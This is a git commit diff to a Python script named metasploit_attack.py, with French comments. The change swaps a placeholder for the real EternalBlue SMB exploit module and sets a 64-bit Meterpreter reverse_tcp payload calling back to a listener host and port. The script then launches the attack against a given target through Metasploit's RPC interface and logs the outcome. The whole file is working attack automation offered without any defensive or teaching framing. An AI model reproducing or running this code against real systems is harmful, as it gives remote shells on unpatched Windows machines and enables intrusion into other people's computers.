130feb9d1a732ccd9a3d930c345cb03edcf0dfc5
Kagath <ericbouchi@live.fr>
2023-05-06 03:35:41 +0200

    Update metasploit_attack.py

--- metasploit_attack.py
+++ metasploit_attack.py
@@ -1,16 +1,26 @@
 from pymetasploit3.msfrpc import MsfRpcClient
+from logger import log_info, log_error
 
 def run_metasploit_scan(target):
     # Remplacez 'my_password' par le mot de passe de votre choix pour la connexion RPC à Metasploit
     client = MsfRpcClient('password', server='localhost', port=55553, ssl=False)
 
-    # Utilisez l'exploit 'example_exploit' comme exemple, remplacez-le par un exploit réel
-    exploit = client.modules.use('exploit', 'example_exploit')
+    # Utilisez un exploit réel, par exemple 'windows/smb/ms17_010_eternalblue'
+    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
     exploit['RHOSTS'] = target
 
-    # Configurez le payload (exemple: windows/meterpreter/reverse_tcp)
-    payload = 'windows/meterpreter/reverse_tcp'
-    exploit.execute(payload=payload)
+    # Configurez le payload (exemple: windows/x64/meterpreter/reverse_tcp)
+    payload = 'windows/x64/meterpreter/reverse_tcp'
+    exploit['LHOST'] = '192.168.1.1'  # Remplacez par votre adresse IP locale réelle
+    exploit['LPORT'] = 4444
+
+    # Exécutez l'exploit
+    log_info(f"Début de l'attaque Metasploit contre {target}")
+    try:
+        result = exploit.execute(payload=payload)
+        log_info(f"Résultat de l'attaque Metasploit: {result}")
+    except Exception as e:
+        log_error(f"Erreur lors de l'attaque Metasploit contre {target}: {e}")
 
     # Fermez la connexion RPC
     client.logout()
